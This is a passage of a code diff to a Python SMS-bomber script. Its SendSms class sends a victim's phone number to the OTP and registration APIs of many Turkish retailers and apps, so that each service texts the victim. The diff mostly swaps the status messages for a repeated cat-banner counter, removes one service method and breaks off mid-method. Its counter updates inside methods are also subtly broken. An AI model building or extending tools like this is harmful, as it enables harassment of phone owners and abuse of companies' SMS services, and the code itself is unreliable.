@@ -2,6 +2,22 @@ import requests
 from random import choice
 from string import ascii_lowercase
 from colorama import Fore, Style
+from os import system
+
+
+toplam = 0
+basarili = 0
+basarisiz = 0
+sayac = 0
+
+def generate(toplam, basarili, basarisiz):
+    print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+    exit()
 
 
 class SendSms():
@@ -23,13 +39,25 @@ class SendSms():
             json={"mobile_number": self.phone, "token_type": "register_token"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:    
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
-        
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1        
      
     #wmf.com.tr
     def Wmf(self):
@@ -46,26 +74,50 @@ class SendSms():
                 "phone": f"0{self.phone}"
             }, timeout=6)
             if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
-                self.adet += 1   
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1   
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
     
     #bim
     def Bim(self):
         try:
             bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
             if bim.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #englishhome.com
     def Englishhome(self):
@@ -75,13 +127,25 @@ class SendSms():
             json={"Phone": "+90"+self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isError"] == False:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
-            
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1            
 
     #icq.net
     def Icq(self):
@@ -90,13 +154,25 @@ class SendSms():
             headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
             r = requests.post(url, headers=headers, timeout=6)
             if r.json()["response"]["statusCode"] == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
-          
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1          
 
     #suiste.com
     def Suiste(self):
@@ -106,26 +182,50 @@ class SendSms():
             data = {"action": "register", "gsm": self.phone}
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json()["code"] == "common.success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
-                
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1                
     
     #KimGbIster
     def KimGb(self):
         try:
             r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
-            
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1            
 
     #tazi.tech
     def Tazi(self):
@@ -135,13 +235,25 @@ class SendSms():
             json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if (r.json()["kod"]) == "0000":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
-            
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1            
     
     #evidea.com
     def Evidea(self):
@@ -151,13 +263,25 @@ class SendSms():
             data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6)      
             if r.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com") 
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #heyscooter.com.tr
     def Hey(self):
@@ -166,13 +290,25 @@ class SendSms():
             headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
             r = requests.post(url, headers=headers, timeout=6)
             if r.json()["IsSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
         
     #bisu.com.tr
     def Bisu(self):
@@ -182,28 +318,27 @@ class SendSms():
             data = {"phoneNumber": self.phone}
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json()["errors"] == None:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bisu.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bisu.com.tr")
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
 
-    #345dijital.com
-    def Ucdortbes(self):
-        try:
-            url = "https://api.345dijital.com:443/api/users/register"
-            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
-            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
-                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
-            self.adet += 1
 
 
     #macrocenter.com.tr
@@ -214,13 +349,25 @@ class SendSms():
             json={"email": self.mail, "phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["successful"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> macrocenter.com.tr")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> macrocenter.com.tr")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #tiklagelsin.com
     def TiklaGelsin(self):
@@ -230,13 +377,25 @@ class SendSms():
             json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["data"]["generateOtp"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
-    
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1    
 
     #ayyildiz.com.tr
     def Ayyildiz(self):
@@ -245,13 +404,25 @@ class SendSms():
             headers = {"Accept": "*/*", "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate", "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
             r = requests.post(url, headers=headers, timeout=6)
             if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #naosstars.com
     def Naosstars(self):
@@ -261,13 +432,25 @@ class SendSms():
             json={"telephone": f"+90{self.phone}", "type": "register"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #istegelsin.com
     def Istegelsin(self):
@@ -277,13 +460,25 @@ class SendSms():
             json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": f"90{self.phone}"}}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["data"]["sendOtp2"]["alreadySent"] == False:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net")
-                self.adet += 1
+                print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+                basarili = basarili + 1
+                toplam = toplam + 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net")
-
+            print(f"""
+      \    /\       Meow.
+       )  ( ')      Toplam                : {Style.BRIGHT}{toplam}{Style.RESET_ALL}
+      (  /  )       Giden sms sayisi      : {Fore.GREEN}{Style.BRIGHT}{basarili}{Style.RESET_ALL}
+asya   \(__)|       Gidemeyen sms sayisi  : {Fore.RED}{Style.BRIGHT}{basarisiz}{Style.RESET_ALL}
+""")
+            toplam = toplam + 1
+            basarisiz = basarisiz + 1
 
     #koton.com
     def Koton(self):
@@ -293,13 +488,25 @@ class SendSms():
             data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.status_code == 202:
